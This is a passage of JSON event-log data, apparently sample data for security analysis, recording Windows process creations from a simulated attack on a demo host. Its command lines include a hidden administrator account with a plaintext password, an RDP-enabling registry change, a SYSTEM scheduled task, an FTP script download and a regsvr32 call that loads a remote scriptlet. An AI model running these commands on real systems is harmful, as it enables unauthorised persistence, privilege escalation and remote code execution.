of\",\"cmd  /c echo timb@microsoft.com; ianhelle@microsoft.com; shainw@microsoft.com\",\"cmd  /c echo open ftp.wh401k.org \",\"ftp  -s:MG06.dll\",\"cacls.exe  C:\\\\Windows\\\\system32\\\\cscript.exe /e /t /g SYSTEM:F\",\"net  users \",\"C:\\\\windows\\\\system32\\\\net1  users \",\"findstr  \\\"abai$\\\"\",\"net  user abai$ Wf9k44_9d[=$ /add\",\"C:\\\\windows\\\\system32\\\\net1  user abai$ Wf9k44_9d[=$ /add\",\"net  user abai$ Wf9k44_9d[=$\",\"C:\\\\windows\\\\system32\\\\net1  user abai$ Wf9k44_9d[=$\",\"findstr  \\\"abai$\\\"\",\"net  localgroup administrators \",\"C:\\\\windows\\\\system32\\\\net1  localgroup administrators \",\"net  localgroup administrators abai$ /add\",\"C:\\\\windows\\\\system32\\\\net1  localgroup administrators abai$ /add\",\"findstr  \\\"www.401hk.com\\\"\",\"net  users \",\"C:\\\\windows\\\\system32\\\\net1  users \",\"net  user www.401hk.com Wf9k44_sinc9d3[=$\",\"C:\\\\windows\\\\system32\\\\net1  user www.401hk.com Wf9k44_sinc9d3[=$\",\"net  user www.401hk.com /active:yes\",\"C:\\\\windows\\\\system32\\\\net1  user www.401hk.com /active:yes\",\"reg  ADD \\\"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\\\"\",\"schtasks.exe  /create /tn  /tr \\\"c:\\\\pagefile.exe /?\\\" /sc hour /mo 1 /ru \\\"system\\\" /f\",\"ping  127.0.0.1 -n 100 \",\"net  localgroup administrators abai$ /delete\",\"C:\\\\windows\\\\system32\\\\net1  localgroup administrators abai$ /delete\",\"net  user abai$ /delete\",\"C:\\\\windows\\\\system32\\\\net1  user abai$ /delete\",\"net  user www.401hk.com /delete\",\"C:\\\\windows\\\\system32\\\\net1  user www.401hk.com /delete\",\"cmd  /c echo End Security Demo tasks\",\"cmd  /c echo Begin Security Demo tasks\",\"cmd  /c echo Any questions about the commands executed here then please contact one of\",\"cmd  /c echo timb@microsoft.com; ianhelle@microsoft.com; shainw@microsoft.com\",\"cmd  /c echo open ftp.wh401k.org \",\"ftp  -s:MG06.dll\",\"cacls.exe  C:\\\\Windows\\\\system32\\\\cscript.exe /e /t /g SYSTEM:F\",\"net  users \",\"C:\\\\windows\\\\system32\\\\net1  users \",\"findstr  \\\"abai$\\\"\",\"net  user abai$ Wf9k44_9d[=$ /add\",\"C:\\\\windows\\\\system32\\\\net1  user abai$ Wf9k44_9d[=$ /add\",\"net  user abai$ Wf9k44_9d[=$\",\"C:\\\\windows\\\\system32\\\\net1  user abai$ Wf9k44_9d[=$\",\"net  localgroup administrators \",\"C:\\\\windows\\\\system32\\\\net1  localgroup administrators \",\"findstr  \\\"abai$\\\"\",\"net  localgroup administrators abai$ /add\",\"C:\\\\windows\\\\system32\\\\net1  localgroup administrators abai$ /add\",\"net  users \",\"C:\\\\windows\\\\system32\\\\net1  users \",\"findstr  \\\"www.401hk.com\\\"\",\"net  user www.401hk.com Wf9k44_9d[=$ /add\",\"C:\\\\windows\\\\system32\\\\net1  user www.401hk.com Wf9k44_9d[=$ /add\",\"net  user www.401hk.com Wf9k44_sinc9d3[=$\",\"C:\\\\windows\\\\system32\\\\net1  user www.401hk.com Wf9k44_sinc9d3[=$\",\"net  user www.401hk.com /active:yes\",\"C:\\\\windows\\\\system32\\\\net1  user www.401hk.com /active:yes\",\"reg  ADD \\\"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\\\"\",\"schtasks.exe  /create /tn  /tr \\\"c:\\\\pagefile.exe /?\\\" /sc hour /mo 1 /ru \\\"system\\\" /f\",\"ping  127.0.0.1 -n 100 \",\"net  localgroup administrators abai$ /delete\",\"C:\\\\windows\\\\system32\\\\net1  localgroup administrators abai$ /delete\",\"net  user abai$ /delete\",\"C:\\\\windows\\\\system32\\\\net1  user abai$ /delete\",\"net  user www.401hk.com /delete\",\"C:\\\\windows\\\\system32\\\\net1  user www.401hk.com /delete\",\"cmd  /c echo End Security Demo tasks\",\"cmd  /c echo Begin Security Demo tasks\",\"cmd  /c echo Any questions about the commands executed here then please contact one of\",\"cmd  /c echo timb@microsoft.com; ianhelle@microsoft.com; shainw@microsoft.com\",\".\\\\regsvr32   /s /n /u /i:http://server/file.sct scrobj.dll\",\"cmd  /c echo End Security Demo tasks\",\"\\\"C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\\\" C:\\\\Users\\\\mstic_admin\\\\Documents\\\\tools\\\\Windows Benign Activity.xml\",\"\\\"C:\\\\Program Files (x86)\\\\Internet Explorer\\\\IEXPLORE.EXE\\\" SCODEF:6444 CREDAT:17410 /prefetch:2\",\"\\\"C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\\\" C:\\\\Users\\\\mstic_admin\\\\Documents\\\\tools\\\\MSTIC Attack Simulation(user).xml\",\"\\\"C:\\\\Program Files (x86)\\\\Internet Explorer\\\\IEXPLORE.EXE\\\" SCODEF:3760 CREDAT:17410 /prefetch:2\",\"\\\"C:\\\\Program Files (x86)\\\\Internet Explorer\\\\IEXPLORE.EXE\\\" SCODEF:3760 CREDAT:82946 /prefetch:2\"],\"Computer\":[\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\",\"BlackHatDemoHos\"],\"EffectiveLogonId\":[\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\"],\"EffectiveLogonId_par\":[\"NaN\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\",\"0x51ed4\"],\"EventID\":[4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688,4688],\"Exe\":[\"explorer.exe\",\"notepad++.exe\",\"notepad++.exe\",\"iexplore.exe\",\"iexplore.exe\",\"iexplore.exe\",\"notepad++.exe\",\"notepad++.exe\",\"cmd.exe\",\"conhost.exe\",\"cmd.exe\",\"cmd.exe\",\"cmd.exe\",\"cmd.exe\",\"ftp.exe\",\"cacls.exe\",\"net.exe\",\"net1.exe\",\"findstr.exe\",\"net.exe\",\"net1.exe\",\"net.exe\",\"net1.exe\",\"net.exe\",\"net1.exe\",\"findstr.exe\",\"net.exe\",\"net1.exe\",\"net.exe\",\"net1.exe\",\"findstr.exe\",\"net.exe\",\"net1.exe\",\"net.exe\",\"net1.exe\",\"net.exe\",\"net1.exe\",\"reg.exe\",\"schtasks.exe\",\"PING.EXE\",\"cmd.exe\",\"conhost.exe\",\"cmd.exe\",\"cmd.exe\",\"cmd.exe\",\"cmd.exe\",\"ftp.exe\",\"cacls.exe\",\"net.exe\",\"net1.exe\",\"findstr.exe\",\"net.exe\",\"net1.exe\",\"net.exe\",\"net1.exe\",\"findstr.exe\",\"net.exe\",\"net1.exe\",\"net.exe\",\"net1.exe\",\"findstr.exe\",\"net.exe\",\"net1.exe\",\"net.exe\",\"net1.exe\",\"net.exe\",\"net1.exe\",\"reg.exe\",\"schtasks.exe\",\"PING.EXE\",\"net.exe\",\"net1.exe\",\"net.exe\",\"net1.exe\",\"net.exe\",\"net1.exe\",\"cmd.exe\",\"cmd.exe\",\"cmd.exe\",\"cmd.exe\",\"cmd.exe\",\"ftp.exe\",\"cacls.exe\",\"net.exe\",\"net1.exe\",\"findstr.exe\",\"net.exe\",\"net1.exe\",\"net.exe\",\"net1.exe\",\"net.exe\",\"net1.exe\",\"findstr.exe\",\"net.exe\",\"net1.exe\",\"net.exe\",\"net1.exe\",\"findstr.exe\",\"net.exe\",\"net1.exe\",\"net.exe\",\"net1.exe\",\"net.exe\",\"net1.exe\",\"reg.exe\",\"schtasks.exe\",\"PING.EXE\",\"net.exe\",\"net1.exe\",\"net.exe\",\"net1.exe\",\"net.exe\",\"net1.exe\",\"cmd.exe\",\"cmd.exe\",\"cmd.exe\",\"cmd.exe\",\"regsvr32.exe\",\"cmd.exe\",\"iexplore.exe\",\"iexplore.exe\",\"iexplore.exe\",\"iexplore.exe\",\"iexplore.exe\"],\"IsBranch\":[false,false,false,true,false,false,false,false,true,false,false,false,false,false,false,false,true,false,false,true,false,true,false,true,false,false,true,false,true,false,false,true,false,true,false,true,false,false,false,false,true,false,false,false,false,false,false,false,true,false,false,true,false,true,false,false,true,false,true,false,false,true,false,true,false,true,false,false,false,false,true,false,true,false,true,false,false,false,false,false,false,false,false,true,false,false,true,false,true,false,true,false,false,true,false,true,false,false,true,false,true,false,true,false,false,false,false,true,false,true,false,true,false,false,false,false,false,false,false,true,false,true,false,false],\"IsLeaf\":[false,true,true,false,true,true,true,true,false,true,true,true,true,true,true,true,false,true,true,false,true,false,true,false,true,true,false,true,false,true,true,false,true,false,true,false,true,true,true,true,false,true,true,true,true,true,true,true,false,true,true,false,true,false,true,true,false,true,false,true,true,false,true,false,true,false,true,true,true,true,false,true,false,true,false,true,true,true,true,true,true,true,true,false,true,true,false,true,false,true,false,true,true,false,true,false,true,true,false,true,false,true,false,true,true,true,true,false,true,false,true,false,true,true,true,true,true,true,true,false,true,false,true,true],\"IsRoot\":[true,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false],\"Level\":[1,2,2,2,3,3,2,2,2,3,3,3,3,3,3,3,3,4,3,3,4,3,4,3,4,3,3,4,3,4,3,3,4,3,4,3,4,3,3,3,2,3,3,3,3,3,3,3,3,4,3,3,4,3,4,3,3,4,3,4,3,3,4,3,4,3,4,3,3,3,3,4,3,4,3,4,3,3,3,3,3,3,3,3,4,3,3,4,3,4,3,4,3,3,4,3,4,3,3,4,3,4,3,4,3,3,3,3,4,3,4,3,4,3,3,3,3,3,3,2,3,2,3,3],\"NewProcessId\":[\"0x167c\",\"0x25b0\",\"0x750\",\"0x20ec\",\"0x464\",\"0x1328\",\"0x1d60\",\"0x1de0\",\"0x26a8\",\"0x1ffc\",\"0x34c\",\"0x1b7c\",\"0x1184\",\"0x13d4\",\"0x17ec\",\"0x16b4\",\"0x1ec\",\"0x1e60\",\"0x121c\",\"0x2704\",\"0x261c\",\"0x248c\",\"0x1454\",\"0xf4c\",\"0x2614\",\"0x6c\",\"0x1528\",\"0x1d98\",\"0x2618\",\"0x2498\",\"0x1058\",\"0x27fc\",\"0x27ec\",\"0x2294\",\"0x19dc\",\"0x2680\",\"0x18bc\",\"0xebc\",\"0x126c\",\"0x1fb0\",\"0x11e0\",\"0x13e8\",\"0x27c4\",\"0x1894\",\"0x2f8\",\"0x1850\",\"0x1280\",\"0x2790\",\"0xf0c\",\"0x1a0c\",\"0x176c\",\"0x2754\",\"0x265c\",\"0x1e4c\",\"0x2450\",\"0x19d0\",\"0x25d8\",\"0x474\",\"0x2244\",\"0x7f4\",\"0x2044\",\"0x5b4\",\"0x1c08\",\"0x314\",\"0xbac\",\"0x113c\",\"0x27e8\",\"0x7e0\",\"0x2514\",\"0xf68\",\"0x161c\",\"0x1c64\",\"0x1bf0\",\"0x3c\",\"0xac8\",\"0x2698\",\"0x20c4\",\"0x40\",\"0x271c\",\"0x1ab4\",\"0x1638\",\"0x13a8\",\"0x10a4\",\"0x1110\",\"0x20dc\",\"0xaa4\",\"0x1148\",\"0x660\",\"0x2604\",\"0x2664\",\"0xf14\",\"0x1108\",\"0x178c\",\"0x1ef8\",\"0x24a8\",\"0xaf0\",\"0xa24\",\"0x1b04\",\"0x1754\",\"0x25a8\",\"0x153c\",\"0x13b0\",\"0x1388\",\"0x24c0\",\"0x1960\",\"0x219c\",\"0x1bf4\",\"0x1e74\",\"0x13e0\",\"0x1440\",\"0x1fd0\",\"0x60c\",\"0x2670\",\"0x5e0\",\"0x1e78\",\"0xe3c\",\"0x2214\",\"0x26cc\",\"0x1404\",\"0x192c\",\"0x1990\",\"0xeb0\",\"0x11cc\",\"0x1780\"],\"NewProcessId_par\":[\"NaN\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x20ec\",\"0x20ec\",\"0x167c\",\"0x167c\",\"0x167c\",\"0x26a8\",\"0x26a8\",\"0x26a8\",\"0x26a8\",\"0x26a8\",\"0x26a8\",\"0x26a8\",\"0x26a8\",\"0x1ec\",\"0x26a8\",\"0x26a8\",\"0x2704\",\"0x26a8\",\"0x248c\",\"0x26a8\",\"0xf4c\",\"0x26a8\",\"0x26a8\",\"0x1528\",\"0x26a8\",\"0x2618\",\"0x26a8\",\"0x26a8\",\"0x27fc\",\"0x26a8\",\"0x2294\",\"0x26a8\",\"0x2680\",\"0x26a8\",\"0x26a8\",\"0x26a8\",\"0x167c\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0xf0c\",\"0x11e0\",\"0x11e0\",\"0x2754\",\"0x11e0\",\"0x1e4c\",\"0x11e0\",\"0x11e0\",\"0x25d8\",\"0x11e0\",\"0x2244\",\"0x11e0\",\"0x11e0\",\"0x5b4\",\"0x11e0\",\"0x314\",\"0x11e0\",\"0x113c\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x161c\",\"0x11e0\",\"0x1bf0\",\"0x11e0\",\"0xac8\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x1110\",\"0x11e0\",\"0x11e0\",\"0x1148\",\"0x11e0\",\"0x2604\",\"0x11e0\",\"0xf14\",\"0x11e0\",\"0x11e0\",\"0x1ef8\",\"0x11e0\",\"0xaf0\",\"0x11e0\",\"0x11e0\",\"0x1754\",\"0x11e0\",\"0x153c\",\"0x11e0\",\"0x1388\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x1e74\",\"0x11e0\",\"0x1440\",\"0x11e0\",\"0x60c\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x11e0\",\"0x167c\",\"0x192c\",\"0x167c\",\"0xeb0\",\"0xeb0\"],\"NewProcessName\":[\"C:\\\\Windows\\\\explorer.exe\",\"C:\\\\Program Files (x86)\\\\Notepad++\\\\notepad++.exe\",\"C:\\\\Program Files (x86)\\\\Notepad++\\\\notepad++.exe\",\"C:\\\\Program Files\\\\internet explorer\\\\iexplore.exe\",\"C:\\\\Program Files (x86)\\\\Internet Explorer\\\\iexplore.exe\",\"C:\\\\Program Files (x86)\\\\Internet Explorer\\\\iexplore.exe\",\"C:\\\\Program Files (x86)\\\\Notepad++\\\\notepad++.exe\",\"C:\\\\Program Files (x86)\\\\Notepad++\\\\notepad++.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\conhost.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\ftp.exe\",\"C:\\\\Windows\\\\System32\\\\cacls.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\findstr.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\findstr.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\findstr.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\reg.exe\",\"C:\\\\Windows\\\\System32\\\\schtasks.exe\",\"C:\\\\Windows\\\\System32\\\\PING.EXE\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\conhost.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\ftp.exe\",\"C:\\\\Windows\\\\System32\\\\cacls.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\findstr.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\findstr.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\findstr.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\reg.exe\",\"C:\\\\Windows\\\\System32\\\\schtasks.exe\",\"C:\\\\Windows\\\\System32\\\\PING.EXE\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\ftp.exe\",\"C:\\\\Windows\\\\System32\\\\cacls.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\findstr.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\findstr.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\findstr.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\reg.exe\",\"C:\\\\Windows\\\\System32\\\\schtasks.exe\",\"C:\\\\Windows\\\\System32\\\\PING.EXE\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\net.exe\",\"C:\\\\Windows\\\\System32\\\\net1.exe\",\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"C:\\\\Windows\\\\System32\\\\cm